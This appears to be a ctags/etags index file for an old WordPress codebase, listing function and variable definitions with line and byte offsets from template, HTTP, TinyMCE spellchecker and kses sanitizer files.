		$r = ( in_array($ed, array('tinymce', 'html', 'test') ) ) ? $ed : $r;r1780,60151
 * Using this function is the proper way to output all needed components for both TinyMCE and Quicktags.is1788,60318
function wp_editor( $content, $editor_id, $settings = array() ) {wp_editor1804,61233
function wp_editor( $content, $editor_id, $settings = array() ) {settings1804,61233
function get_search_query( $escaped = true ) {get_search_query1824,61852
function get_search_query( $escaped = true ) {escaped1824,61852
	$query = apply_filters( 'get_search_query', get_query_var( 's' ) );query1825,61899
		$query = esc_attr( $query );query1827,61985
function the_search_query() {the_search_query1840,62266
function language_attributes($doctype = 'html') {language_attributes1854,62643
	$attributes = array();attributes1855,62693
	$output = '';output1856,62717
	if ( $lang = get_bloginfo('language') ) {lang1861,62834
		if ( get_option('html_type') == 'text/html' || $doctype == 'html' )doctype1862,62877
		if ( get_option('html_type') != 'text/html' || $doctype == 'xhtml' )doctype1865,62985
	$output = implode(' ', $attributes);output1869,63101
	$output = apply_filters('language_attributes', $output);output1870,63139
 * Technically, the function can be used to create paginated link list for anycan1877,63273
function paginate_links( $args = '' ) {paginate_links1919,65545
function paginate_links( $args = '' ) {args1919,65545
	$defaults = array(defaults1920,65585
	$args = wp_parse_args( $args, $defaults );args1936,66074
	$total = (int) $total;total1940,66192
	$current  = (int) $current;current1943,66245
	$end_size = 0  < (int) $end_size ? (int) $end_size : 1; // Out of bounds?  Make it the default.end_size1944,66274
	$mid_size = 0 <= (int) $mid_size ? (int) $mid_size : 2;mid_size1945,66371
	$add_args = is_array($add_args) ? $add_args : false;add_args1946,66428
	$r = '';r1947,66482
	$page_links = array();page_links1948,66492
	$n = 0;n1949,66516
	$dots = false;dots1950,66525
		$link = str_replace('%_%', 2 == $current ? '' : $format, $base);link1953,66591
		$link = str_replace('%#%', $current - 1, $link);link1954,66658
			$link = add_query_arg( $add_args, $link );link1956,66728
	for ( $n = 1; $n <= $total; $n++ ) :n1960,66948
		$n_display = number_format_i18n($n);n_display1961,66986
		if ( $n == $current ) :n1962,67025
			$dots = true;dots1964,67126
				$link = str_replace('%_%', 1 == $n ? '' : $format, $base);link1967,67300
				$link = str_replace('%#%', $n, $link);link1968,67363
					$link = add_query_arg( $add_args, $link );link1970,67427
				$dots = true;dots1973,67632
				$dots = false;dots1976,67773
		$link = str_replace('%_%', $format, $base);link1981,67894
		$link = str_replace('%#%', $current + 1, $link);link1982,67940
			$link = add_query_arg( $add_args, $link );link1984,68010
			$r = join("\n", $page_links);r1998,68456
function wp_admin_css_color($key, $name, $url, $colors = array()) {wp_admin_css_color2020,69133
function wp_admin_css_color($key, $name, $url, $colors = array()) {colors2020,69133
		$_wp_admin_css_colors = array();_wp_admin_css_colors2024,69271
function register_admin_color_schemes() {register_admin_color_schemes2034,69482
function wp_admin_css_uri( $file = 'wp-admin' ) {wp_admin_css_uri2050,70070
function wp_admin_css_uri( $file = 'wp-admin' ) {file2050,70070
		$_file = "./$file.css";_file2052,70155
		$_file = admin_url("$file.css");_file2054,70191
	$_file = add_query_arg( 'version', get_bloginfo( 'version' ),  $_file );_file2056,70229
function wp_admin_css( $file = 'wp-admin', $force_echo = false ) {wp_admin_css2083,71391
function wp_admin_css( $file = 'wp-admin', $force_echo = false ) {file2083,71391
		$wp_styles = new WP_Styles();wp_styles2086,71517
	$handle = 0 === strpos( $file, 'css/' ) ? substr( $file, 4 ) : $file;handle2089,71581
function add_thickbox() {add_thickbox2113,72540
function wp_generator() {wp_generator2126,72825
function the_generator( $type ) {the_generator2141,73314
function get_the_generator( $type = '' ) {get_the_generator2158,73926
function get_the_generator( $type = '' ) {type2158,73926
		$current_filter = current_filter();current_filter2161,73995
				$type = 'rss2';type2168,74162
				$type = 'comment';type2172,74236
				$type = 'rdf';type2175,74293
				$type = 'atom';type2180,74397
			$gen = '<meta name="generator" content="WordPress ' . get_bloginfo( 'version' ) . '">';gen2187,74471
			$gen = '<meta name="generator" content="WordPress ' . get_bloginfo( 'version' ) . '" />';gen2190,74588
			$gen = '<generator uri="http://wordpress.org/" version="' . get_bloginfo_rss( 'version' ) . '">WordPress</generator>';gen2193,74706
			$gen = '<generator>http://wordpress.org/?v=' . get_bloginfo_rss( 'version' ) . '</generator>';gen2196,74853
			$gen = '<admin:generatorAgent rdf:resource="http://wordpress.org/?v=' . get_bloginfo_rss( 'version' ) . '" />';gen2199,74975
			$gen = '<!-- generator="WordPress/' . get_bloginfo( 'version' ) . '" -->';gen2202,75118
			$gen = '<!-- generator="WordPress/' . get_bloginfo_rss('version') . '" created="'. date('Y-m-d H:i') . '" -->';gen2205,75223
function checked( $checked, $current = true, $echo = true ) {checked2223,75805
function checked( $checked, $current = true, $echo = true ) {current2223,75805
function selected( $selected, $current = true, $echo = true ) {selected2239,76332
function selected( $selected, $current = true, $echo = true ) {current2239,76332
function disabled( $disabled, $current = true, $echo = true ) {disabled2255,76863
function disabled( $disabled, $current = true, $echo = true ) {current2255,76863
 * Private helper function for checked, selected, and disabled.for2260,77011
function __checked_selected_helper( $helper, $current, $echo, $type ) {__checked_selected_helper2273,77502
	if ( (string) $helper === (string) $current )helper2274,77574
		$result = " $type='$type'";result2275,77621
		$result = '';result2277,77657

wordpress/wp-includes/http.php,2974
function &_wp_http_get_object() {_wp_http_get_object22,397
	static $http;http23,431
		$http = new WP_Http();http26,470
 * $res = array( 'headers' => array(), 'response' => array('code' => int, 'message' => string) );res37,630
 * $user_agent = $res['headers']['user-agent'];user_agent44,910
 * This function is called first to make the request and there are other APIis49,1055
function wp_remote_request($url, $args = array()) {wp_remote_request58,1377
function wp_remote_request($url, $args = array()) {args58,1377
	$objFetchSite = _wp_http_get_object();objFetchSite59,1429
function wp_remote_get($url, $args = array()) {wp_remote_get74,1864
function wp_remote_get($url, $args = array()) {args74,1864
	$objFetchSite = _wp_http_get_object();objFetchSite75,1912
function wp_remote_post($url, $args = array()) {wp_remote_post90,2344
function wp_remote_post($url, $args = array()) {args90,2344
	$objFetchSite = _wp_http_get_object();objFetchSite91,2393
function wp_remote_head($url, $args = array()) {wp_remote_head106,2826
function wp_remote_head($url, $args = array()) {args106,2826
	$objFetchSite = _wp_http_get_object();objFetchSite107,2875
function wp_remote_retrieve_headers(&$response) {wp_remote_retrieve_headers119,3171
function wp_remote_retrieve_header(&$response, $header) {wp_remote_retrieve_header135,3662
function wp_remote_retrieve_response_code(&$response) {wp_remote_retrieve_response_code155,4226
function wp_remote_retrieve_response_message(&$response) {wp_remote_retrieve_response_message172,4726
function wp_remote_retrieve_body(&$response) {wp_remote_retrieve_body187,5163
function wp_http_supports( $capabilities = array(), $url = null ) {wp_http_supports204,5668
function wp_http_supports( $capabilities = array(), $url = null ) {capabilities204,5668
	$objFetchSite = _wp_http_get_object();objFetchSite205,5736
	$capabilities = wp_parse_args( $capabilities );capabilities207,5777
	$count = count( $capabilities );count209,5827
		$capabilities = array_combine( array_values( $capabilities ), array_fill( 0, $count, true ) );capabilities213,6057
		$scheme = parse_url( $url, PHP_URL_SCHEME );scheme217,6207
function get_http_origin() {get_http_origin233,6567
	$origin = '';origin234,6596
		$origin = $_SERVER[ 'HTTP_ORIGIN' ];origin236,6657
function get_allowed_http_origins() {get_allowed_http_origins248,6860
	$admin_origin = parse_url( admin_url() );admin_origin249,6898
	$home_origin = parse_url( home_url() );home_origin250,6941
	$allowed_origins = array_unique( array(allowed_origins253,7008
function is_allowed_http_origin( $origin = null ) {is_allowed_http_origin271,7518
function is_allowed_http_origin( $origin = null ) {origin271,7518
	$origin_arg = $origin;origin_arg272,7570
		$origin = get_http_origin();origin275,7620
		$origin = '';origin278,7721
function send_origin_headers() {send_origin_headers292,8059
	$origin = get_http_origin();origin293,8092

wordpress/wp-includes/js/tinymce/langs/wp-langs.php,557
function mce_escape($text) {mce_escape7,69
function wp_mce_translation() {wp_mce_translation14,218
	$default = array(default16,251
	$advanced = array(advanced269,8824
	$advanced_dlg = array(advanced_dlg335,11643
	$media_dlg = array(media_dlg390,14037
	$wordpress = array(wordpress500,17958
	$wpeditimage = array(wpeditimage515,18515
	$locale = _WP_Editors::$mce_locale;locale551,19610
	$translated = 'tinyMCE.addI18n({' . $locale . ':' . json_encode( $default ) . "});\n";translated553,19648
$lang = wp_mce_translation();lang563,20277

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/EnchantSpell.php,727
 * This class was contributed by Michel Weimerskirch.was5,76
class EnchantSpell extends SpellChecker {EnchantSpell12,270
	function &checkWords($lang, $words) {checkWords20,576
		$r = enchant_broker_init();r21,615
			$d = enchant_broker_request_dict($r, $lang);d24,694
			$returnData = array();returnData26,746
			foreach($words as $key => $value) {key27,772
				$correct = enchant_dict_check($d, $value);correct28,811
	function &getSuggestions($lang, $word) {getSuggestions49,1334
		$r = enchant_broker_init();r50,1376
			$d = enchant_broker_request_dict($r, $lang);d53,1453
			$suggs = enchant_dict_suggest($d, $word);suggs54,1501
				$suggs = array();suggs58,1625
			$suggs = array();suggs62,1692

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/GoogleSpell.php,1869
class GoogleSpell extends SpellChecker {GoogleSpell10,213
	function &checkWords($lang, $words) {checkWords18,461
		$wordstr = implode(' ', $words);wordstr19,500
		$matches = $this->_getMatches($lang, $wordstr);matches20,535
		$words = array();words21,585
	function &getSuggestions($lang, $word) {getSuggestions36,1015
		$sug = array();sug37,1057
		$osug = array();osug38,1075
		$matches = $this->_getMatches($lang, $word);matches39,1094
			$sug = explode("\t", utf8_encode($this->_unhtmlentities($matches[0][4])));sug42,1169
	function &_getMatches($lang, $str) {_getMatches53,1354
		$server = "www.google.com";server54,1392
		$port = 443;port55,1422
		$path = "/tbproxy/spell?lang=" . $lang . "&hl=en";path56,1437
		$host = "www.google.com";host57,1490
		$url = "https://" . $server;url58,1518
		$xml = '<?xml version="1.0" encoding="utf-8" ?><spellrequest textalreadyclipped="0" ignoredups="0" ignoredigits="1" ignoreallcaps="1"><text>' . $str . '</text></spellrequest>';xml61,1573
		$header  = "POST ".$path." HTTP/1.0 \r\n";header63,1753
			$ch = curl_init();ch77,2272
			$xml = curl_exec($ch);xml82,2486
			$fp = fsockopen("ssl://" . $server, $port, $errno, $errstr, 30);fp86,2565
				$xml = "";xml92,2715
		$matches = array();matches102,2897
	function _unhtmlentities($string) {_unhtmlentities108,3050
		$string = preg_replace('~&#x([0-9a-f]+);~ei', 'chr(hexdec("\\1"))', $string);string109,3087
		$string = preg_replace('~&#([0-9]+);~e', 'chr(\\1)', $string);string110,3167
		$trans_tbl = get_html_translation_table(HTML_ENTITIES);trans_tbl112,3233
		$trans_tbl = array_flip($trans_tbl);trans_tbl113,3291
	function mb_substr($str, $start, $len = '', $encoding="UTF-8"){mb_substr121,3441
	function mb_substr($str, $start, $len = '', $encoding="UTF-8"){len121,3441
		$limit = strlen($str);limit122,3506

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/PSpell.php,539
class PSpell extends SpellChecker {PSpell10,213
	function &checkWords($lang, $words) {checkWords18,456
		$plink = $this->_getPLink($lang);plink19,495
		$outWords = array();outWords21,532
	function &getSuggestions($lang, $word) {getSuggestions37,941
		$words = pspell_suggest($this->_getPLink($lang), $word);words38,983
	function &_getPLink($lang) {_getPLink49,1182
		$plink = pspell_new(plink55,1382
			$pspellConfig = pspell_config_create(pspellConfig65,1608
			$plink = pspell_new_config($pspell_config);plink72,1781

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/PSpellShell.php,1281
class PSpellShell extends SpellChecker {PSpellShell10,213
	function &checkWords($lang, $words) {checkWords18,461
		$cmd = $this->_getCMD($lang);cmd19,500
			foreach($words as $key => $value)key24,600
		$data = shell_exec($cmd);data31,757
		$returnData = array();returnData34,814
		$dataArr = preg_split("/[\r\n]/", $data, -1, PREG_SPLIT_NO_EMPTY);dataArr35,839
			$matches = array();matches38,941
	function &getSuggestions($lang, $word) {getSuggestions60,1440
		$cmd = $this->_getCMD($lang);cmd61,1482
            $word = mb_convert_encoding($word, "ISO-8859-1", mb_detect_encoding($word, "UTF-8"));word64,1567
            $word = utf8_encode($word);word66,1678
		$data = shell_exec($cmd);data75,1888
		$returnData = array();returnData78,1945
		$dataArr = preg_split("/\n/", $data, -1, PREG_SPLIT_NO_EMPTY);dataArr79,1970
			$matches = array();matches82,2067
				$words = array_slice(explode(',', $matches[1]), 0, 10);words91,2234
	function _getCMD($lang) {_getCMD103,2422
		$this->_tmpfile = tempnam($this->_config['PSpellShell.tmp'], "tinyspell");_tmpfile104,2449
		$file = $this->_tmpfile;file106,2527
		$lang = preg_replace("/[^-_a-z]/", "", strtolower($lang));lang107,2554
		$bin  = $this->_config['PSpellShell.aspell'];bin108,2615

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/SpellChecker.php,451
class SpellChecker {SpellChecker10,213
	function SpellChecker(&$config) {SpellChecker16,316
		$this->_config = $config;_config17,351
	 * Simple loopback function everything that gets in will be send back.everything21,388
	function &loopback(/* args.. */) {loopback26,550
	function &checkWords($lang, $words) {checkWords37,823
	function &getSuggestions($lang, $word) {getSuggestions48,1129
	function throwError($str) {throwError57,1338

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/utils/JSON.php,5728
define('JSON_BOOL', 1);JSON_BOOL10,192
define('JSON_INT', 2);JSON_INT11,216
define('JSON_STR', 3);JSON_STR12,239
define('JSON_FLOAT', 4);JSON_FLOAT13,262
define('JSON_NULL', 5);JSON_NULL14,287
define('JSON_START_OBJ', 6);JSON_START_OBJ15,311
define('JSON_END_OBJ', 7);JSON_END_OBJ16,340
define('JSON_START_ARRAY', 8);JSON_START_ARRAY17,367
define('JSON_END_ARRAY', 9);JSON_END_ARRAY18,398
define('JSON_KEY', 10);JSON_KEY19,427
define('JSON_SKIP', 11);JSON_SKIP20,451
define('JSON_IN_ARRAY', 30);JSON_IN_ARRAY22,477
define('JSON_IN_OBJECT', 40);JSON_IN_OBJECT23,506
define('JSON_IN_BETWEEN', 50);JSON_IN_BETWEEN24,536
class Moxiecode_JSONReader {Moxiecode_JSONReader26,568
	var $_needProp;_needProp30,681
	function Moxiecode_JSONReader($data) {Moxiecode_JSONReader32,699
		$this->_data = $data;_data33,739
		$this->_len = strlen($data);_len34,763
		$this->_pos = -1;_pos35,794
		$this->_location = JSON_IN_BETWEEN;_location36,814
		$this->_lastLocations = array();_lastLocations37,852
		$this->_needProp = false;_needProp38,887
	function getToken() {getToken41,919
	function getLocation() {getLocation45,970
	function getTokenName() {getTokenName49,1027
	function getValue() {getValue85,1585
	function readToken() {readToken89,1636
		$chr = $this->read();chr90,1660
					$this->_location = JSON_IN_ARRAY;_location96,1788
					$this->_token = JSON_START_ARRAY;_token97,1827
					$this->_value = null;_value98,1866
					$this->_location = array_pop($this->_lastLocation);_location103,1950
					$this->_token = JSON_END_ARRAY;_token104,2007
					$this->_value = null;_value105,2044
						$this->_needProp = true;_needProp109,2141
					$this->_location = JSON_IN_OBJECT;_location115,2254
					$this->_needProp = true;_needProp116,2294
					$this->_token = JSON_START_OBJ;_token117,2324
					$this->_value = null;_value118,2361
					$this->_location = array_pop($this->_lastLocation);_location123,2445
					$this->_token = JSON_END_OBJ;_token124,2502
					$this->_value = null;_value125,2537
						$this->_needProp = true;_needProp129,2634
					if (is_numeric($chr) || $chr == '-' || $chr == '.')chr149,2934
	function _readBool($chr) {_readBool159,3079
		$this->_token = JSON_BOOL;_token160,3107
		$this->_value = $chr == 't';_value161,3136
			$this->_needProp = true;_needProp171,3333
	function _readNull() {_readNull176,3381
		$this->_token = JSON_NULL;_token177,3405
		$this->_value = null;_value178,3434
			$this->_needProp = true;_needProp184,3569
	function _readString($quote) {_readString189,3617
		$output = "";output190,3649
		$this->_token = JSON_STR;_token191,3665
		$endString = false;endString192,3693
					$chr = $this->read();chr201,3861
							$endString = true;endString237,4427
						$chr = $this->read();chr239,4454
		$this->_value = $output;_value255,4693
			$this->_token = JSON_KEY;_token259,4770
			$this->_needProp = false;_needProp260,4799
			$this->_needProp = true;_needProp265,4912
	function _int2utf8($int) {_int2utf8270,4960
		$int = intval($int);int271,4988
	function _readNumber($start) {_readNumber291,5512
		$value = "";value292,5544
		$isFloat = false;isFloat293,5559
		$this->_token = JSON_INT;_token295,5580
			if (is_numeric($chr) || $chr == '-' || $chr == '.') {chr299,5670
					$isFloat = true;isFloat301,5748
			$this->_token = JSON_FLOAT;_token311,5866
			$this->_value = floatval($value);_value312,5897
			$this->_value = intval($value);_value314,5943
			$this->_needProp = true;_needProp317,6042
	function readAway() {readAway322,6090
	function read($len = 1) {read331,6245
				$str = substr($this->_data, $this->_pos + 1, $len);str334,6326
	function skip($len) {skip345,6499
	function peek() {peek349,6549
 * This class handles JSON stuff.handles358,6668
class Moxiecode_JSON {Moxiecode_JSON362,6737
	function Moxiecode_JSON() {Moxiecode_JSON363,6760
	function decode($input) {decode366,6793
		$reader = new Moxiecode_JSONReader($input);reader367,6820
	function readValue(&$reader) {readValue372,6907
		$this->data = array();data373,6939
		$this->parents = array();parents374,6964
		$this->cur =& $this->data;cur375,6992
		$key = null;key376,7021
		$loc = JSON_IN_ARRAY;loc377,7036
					$key = $reader->getValue();key401,7528
					$cur =& $obj;cur411,7728
					$loc = $reader->getLocation();loc413,7748
					$loc = $reader->getLocation();loc418,7845
						$this->cur =& $this->parents[count($this->parents) - 1];cur421,7920
	function addArray($key) {addArray432,8157
		$ar = array();ar434,8218
		$this->cur =& $ar;cur441,8308
	function getDelim($index, &$reader) {getDelim444,8333
	function encode($input) {encode456,8525
	function encodeString($input) {encodeString484,8997
			$output = '';output487,9101
						$byte = ord($input[$i]);byte524,9631
							$char = pack('C*', $byte, ord($input[$i + 1]));char527,9699
							$char = pack('C*', $byte, ord($input[$i + 1]), ord($input[$i + 2]));char531,9881
							$char = pack('C*', $byte, ord($input[$i + 1]), ord($input[$i + 2]), ord($input[$i + 3]));char535,10084
							$char = pack('C*', $byte, ord($input[$i + 1]), ord($input[$i + 2]), ord($input[$i + 3]), ord($input[$i + 4]));char539,10308
							$char = pack('C*', $byte, ord($input[$i + 1]), ord($input[$i + 2]), ord($input[$i + 3]), ord($input[$i + 4]), ord($input[$i + 5]));char543,10553
	function _utf82utf16($utf8) {_utf82utf16557,10922
	function _encodeArray($input) {_encodeArray575,11407
		$output = '';output576,11440
		$isIndexed = true;isIndexed577,11456
		$keys = array_keys($input);keys579,11478
				$isIndexed = false;isIndexed583,11663

wordpress/wp-includes/js/tinymce/plugins/spellchecker/classes/utils/Logger.php,4023
define('MC_LOGGER_DEBUG', 0);MC_LOGGER_DEBUG11,234
define('MC_LOGGER_INFO', 10);MC_LOGGER_INFO12,264
define('MC_LOGGER_WARN', 20);MC_LOGGER_WARN13,294
define('MC_LOGGER_ERROR', 30);MC_LOGGER_ERROR14,324
define('MC_LOGGER_FATAL', 40);MC_LOGGER_FATAL15,355
 * Logging utility class. This class handles basic logging with levels, log rotation and custom log formats. It'shandles18,391
class Moxiecode_Logger {Moxiecode_Logger21,568
	var $_path;_path23,612
	var $_filename;_filename24,625
	var $_maxSize;_maxSize25,642
	var $_maxFiles;_maxFiles26,658
	var $_maxSizeBytes;_maxSizeBytes27,675
	var $_level;_level28,696
	var $_format;_format29,710
	function Moxiecode_Logger() {Moxiecode_Logger34,774
		$this->_path = "";_path35,805
		$this->_filename = "{level}.log";_filename36,826
		$this->_maxFiles = 10;_maxFiles38,891
		$this->_level = MC_LOGGER_DEBUG;_level39,916
		$this->_format = "[{time}] [{level}] {message}";_format40,951
	function setLevel($level) {setLevel48,1151
					$level = MC_LOGGER_DEBUG;level52,1258
					$level = MC_LOGGER_INFO;level56,1319
					$level = MC_LOGGER_WARN;level61,1399
					$level = MC_LOGGER_ERROR;level65,1460
					$level = MC_LOGGER_FATAL;level69,1522
					$level = MC_LOGGER_FATAL;level73,1579
		$this->_level = $level;_level77,1620
	function getLevel() {getLevel85,1790
	function setPath($path) {setPath89,1841
		$this->_path = $path;_path90,1868
	function getPath() {getPath93,1896
	function setFileName($file_name) {setFileName97,1945
		$this->_filename = $file_name;_filename98,1981
	function getFileName() {getFileName101,2018
	function setFormat($format) {setFormat105,2075
		$this->_format = $format;_format106,2106
	function getFormat() {getFormat109,2138
	function setMaxSize($size) {setMaxSize113,2191
		$logMaxSizeBytes = intval(preg_replace("/[^0-9]/", "", $size));logMaxSizeBytes115,2243
		$this->_maxSizeBytes = $logMaxSizeBytes;_maxSizeBytes125,2489
		$this->_maxSize = $size;_maxSize126,2532
	function getMaxSize() {getMaxSize129,2563
	function setMaxFiles($max_files) {setMaxFiles133,2618
		$this->_maxFiles = $max_files;_maxFiles134,2654
	function getMaxFiles() {getMaxFiles137,2691
	function debug($msg) {debug141,2748
		$args = func_get_args();args142,2772
	function info($msg) {info146,2860
		$args = func_get_args();args147,2883
	function warn($msg) {warn151,2970
		$args = func_get_args();args152,2993
	function error($msg) {error156,3080
		$args = func_get_args();args157,3104
	function fatal($msg) {fatal161,3192
		$args = func_get_args();args162,3216
	function isDebugEnabled() {isDebugEnabled166,3304
	function isInfoEnabled() {isInfoEnabled170,3380
	function isWarnEnabled() {isWarnEnabled174,3454
	function isErrorEnabled() {isErrorEnabled178,3528
	function isFatalEnabled() {isFatalEnabled182,3604
	function _logMsg($level, $message) {_logMsg186,3680
		$roll = false;roll187,3718
		$logFile = $this->toOSPath($this->_path . "/" . $this->_filename);logFile192,3778
				$levelName = "DEBUG";levelName196,3893
				$levelName = "INFO";levelName200,3955
				$levelName = "WARN";levelName204,4016
				$levelName = "ERROR";levelName208,4078
				$levelName = "FATAL";levelName212,4141
		$logFile = str_replace('{level}', strtolower($levelName), $logFile);logFile216,4183
		$text = $this->_format;text218,4255
		$text = str_replace('{time}', date("Y-m-d H:i:s"), $text);text219,4281
		$text = str_replace('{level}', strtolower($levelName), $text);text220,4342
		$text = str_replace('{message}', $message, $text);text221,4407
		$message = $text . "\r\n";message222,4460
			$size = @filesize($logFile);size226,4541
				$roll = true;roll229,4630
				$rfile = $this->toOSPath($logFile . "." . $i);rfile235,4745
				$nfile = $this->toOSPath($logFile . "." . ($i+1));nfile236,4796
			$delfile = $this->toOSPath($logFile . "." . ($this->_maxFiles + 1));delfile245,5001
	function toOSPath($path) {toOSPath263,5374

wordpress/wp-includes/js/tinymce/plugins/spellchecker/config.php,0

wordpress/wp-includes/js/tinymce/plugins/spellchecker/includes/general.php,982
$config = array();config11,196
function getRequestParam($name, $default_value = false) {getRequestParam28,867
function getRequestParam($name, $default_value = false) {default_value28,867
		$newarray = array();newarray33,1017
		foreach ($_REQUEST[$name] as $name => $value)name35,1041
function &getLogger() {getLogger44,1173
		$mcLogger = $man->getLogger();mcLogger48,1241
		$mcLogger = new Moxiecode_Logger();mcLogger51,1294
function debug($msg) {debug63,1549
	$args = func_get_args();args64,1572
	$log = getLogger();log66,1599
function info($msg) {info70,1659
	$args = func_get_args();args71,1681
	$log = getLogger();log73,1708
function error($msg) {error77,1767
	$args = func_get_args();args78,1790
	$log = getLogger();log80,1817
function warn($msg) {warn84,1877
	$args = func_get_args();args85,1899
	$log = getLogger();log87,1926
function fatal($msg) {fatal91,1985
	$args = func_get_args();args92,2008
	$log = getLogger();log94,2035

wordpress/wp-includes/js/tinymce/plugins/spellchecker/rpc.php,978
$raw = "";raw21,603
	$raw = getRequestParam("json_data");raw25,660
	$raw = $_GLOBALS["HTTP_RAW_POST_DATA"];raw29,793
	$raw = $HTTP_RAW_POST_DATA;raw33,900
		$fp = fopen("php://input", "r");fp38,1003
			$raw = "";raw40,1051
				$raw = fread($fp, 1024);raw43,1088
		$raw = "" . file_get_contents("php://input");raw48,1146
	$url = parse_url($config['general.remote_rpc_url']);url57,1459
	$req = "POST " . $url["path"] . " HTTP/1.0\r\n";req60,1532
	$errno = $errstr = "";errno69,1803
	$socket = fsockopen($url['host'], intval($url['port']), $errno, $errstr, 30);socket71,1828
		$resp = "";resp77,2010
		$resp = explode("\r\n\r\n", $resp);resp84,2137
$json = new Moxiecode_JSON();json92,2239
$input = $json->decode($raw);input93,2269
	$spellchecker = new $config['general.engine']($config);spellchecker97,2355
	$result = call_user_func_array(array($spellchecker, $input['method']), $input['params']);result98,2412
$output = array(output103,2743

wordpress/wp-includes/js/tinymce/wp-mce-help.php,107
	function d(id) { return document.getElementById(id); }d163,3047
	function flipTab(n) {flipTab165,3104

wordpress/wp-includes/js/tinymce/wp-tinymce.php,315
$basepath = dirname(__FILE__);basepath9,158
function get_file($path) {get_file11,190
		$path = realpath($path);path14,254
$expires_offset = 31536000;expires_offset22,374
	&& false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') && ( $file = get_file($basepath . '/wp-tinymce.js.gz') ) ) {file30,748

wordpress/wp-includes/kses.php,11601
	define( 'CUSTOM_TAGS', false );CUSTOM_TAGS40,1291
	$allowedposttags = array(allowedposttags51,1518
	$allowedtags = array(allowedtags445,8582
	$allowedentitynames = array(allowedentitynames485,9344
 * This function makes sure that only the allowed HTML element names, attributemakes533,12019
function wp_kses($string, $allowed_html, $allowed_protocols = array ()) {wp_kses550,12824
function wp_kses($string, $allowed_html, $allowed_protocols = array ()) {allowed_protocols550,12824
		$allowed_protocols = wp_allowed_protocols();allowed_protocols552,12934
	$string = wp_kses_no_null($string);string553,12981
	$string = wp_kses_js_entities($string);string554,13018
	$string = wp_kses_normalize_entities($string);string555,13059
	$allowed_html_fixed = wp_kses_array_lc($allowed_html);allowed_html_fixed556,13107
	$string = wp_kses_hook($string, $allowed_html_fixed, $allowed_protocols); // WP changed the order of these funcs and added args to wp_kses_hookstring557,13163
function wp_kses_hook($string, $allowed_html, $allowed_protocols) {wp_kses_hook574,13835
	$string = apply_filters('pre_kses', $string, $allowed_html, $allowed_protocols);string575,13903
 * This function returns kses' version number.returns580,14009
function wp_kses_version() {wp_kses_version586,14120
function wp_kses_split($string, $allowed_html, $allowed_protocols) {wp_kses_split602,14498
	$pass_allowed_html = $allowed_html;pass_allowed_html604,14620
	$pass_allowed_protocols = $allowed_protocols;pass_allowed_protocols605,14657
function _wp_kses_split_callback( $match ) {_wp_kses_split_callback615,14891
 * This function does a lot of work. It rejects some very malformed things likedoes623,15143
function wp_kses_split2($string, $allowed_html, $allowed_protocols) {wp_kses_split2641,15844
	$string = wp_kses_stripslashes($string);string642,15914
		$string = str_replace( array('<!--', '-->'), '', $string );string649,16084
			$string = $newstring;string651,16236
		if ( $string == '' )string652,16261
		$string = preg_replace('/--+/', '-', $string);string655,16339
		$string = preg_replace('/-$/', '', $string);string657,16432
	$slash = trim($matches[1]);slash666,16656
	$elem = $matches[2];elem667,16685
	$attrlist = $matches[3];attrlist668,16707
function wp_kses_attr($element, $attr, $allowed_html, $allowed_protocols) {wp_kses_attr698,17746
	$xhtml_slash = '';xhtml_slash701,17887
		$xhtml_slash = ' /';xhtml_slash703,17945
	$attrarr = wp_kses_hair($attr, $allowed_protocols);attrarr710,18176
	$attr2 = '';attr2714,18316
	$allowed_attr = $allowed_html[strtolower($element)];allowed_attr716,18331
		$current = $allowed_attr[strtolower($arreach['name'])];current721,18528
		if ( $current == '' )current722,18586
			$orig_value = $arreach['value'];orig_value726,18708
			$value = safecss_filter_attr( $orig_value );value727,18744
			$ok = true;ok742,19079
			foreach ($current as $currkey => $currval) {currkey743,19094
					$ok = false;ok745,19238
	$attr2 = preg_replace('/[<>]/', '', $attr2);attr2756,19427
 * This function does a lot of work. It parses an attribute list into an arraydoes764,19587
function wp_kses_hair($attr, $allowed_protocols) {wp_kses_hair778,20354
	$attrarr = array ();attrarr779,20405
	$mode = 0;mode780,20427
	$attrname = '';attrname781,20439
	$uris = array('xmlns', 'profile', 'href', 'src', 'cite', 'classid', 'codebase', 'data', 'usemap', 'longdesc', 'action');uris782,20456
		$working = 0; # Was the last operation successful?working787,20651
					$attrname = $match[1];attrname793,20829
					$working = $mode = 1;working794,20857
					$attr = preg_replace('/^[-a-zA-Z]+/', '', $attr);attr795,20884
					$working = 1;working804,21073
					$mode = 2;mode805,21092
					$attr = preg_replace('/^\s*=\s*/', '', $attr);attr806,21108
					$working = 1;working812,21235
					$mode = 0;mode813,21254
					$attr = preg_replace('/^\s+/', '', $attr);attr817,21446
					$thisval = $match[1];thisval827,21658
						$thisval = wp_kses_bad_protocol($thisval, $allowed_protocols);thisval829,21736
					$working = 1;working834,22003
					$mode = 0;mode835,22022
					$attr = preg_replace('/^"[^"]*"(\s+|$)/', '', $attr);attr836,22038
					$thisval = $match[1];thisval843,22198
						$thisval = wp_kses_bad_protocol($thisval, $allowed_protocols);thisval845,22276
					$working = 1;working850,22541
					$mode = 0;mode851,22560
					$attr = preg_replace("/^'[^']*'(\s+|$)/", '', $attr);attr852,22576
					$thisval = $match[1];thisval859,22736
						$thisval = wp_kses_bad_protocol($thisval, $allowed_protocols);thisval861,22814
					$working = 1;working867,23133
					$mode = 0;mode868,23152
					$attr = preg_replace("%^[^\s\"']+(\s+|$)%", '', $attr);attr869,23168
			$attr = wp_kses_html_error($attr);attr877,23326
			$mode = 0;mode878,23364
function wp_kses_check_attr_val($value, $vless, $checkname, $checkvalue) {wp_kses_check_attr_val904,24147
	$ok = true;ok905,24222
				$ok = false;ok914,24530
				$ok = false;ok922,24724
				$ok = false;ok933,25171
				$ok = false;ok935,25217
				$ok = false;ok943,25459
				$ok = false;ok945,25505
				$ok = false;ok955,25872
 * This function removes all non-allowed protocols from the beginning ofremoves965,25974
function wp_kses_bad_protocol($string, $allowed_protocols) {wp_kses_bad_protocol976,26446
	$string = wp_kses_no_null($string);string977,26507
	$iterations = 0;iterations978,26544
		$original_string = $string;original_string981,26569
		$string = wp_kses_bad_protocol_once($string, $allowed_protocols);string982,26599
function wp_kses_no_null($string) {wp_kses_no_null999,26917
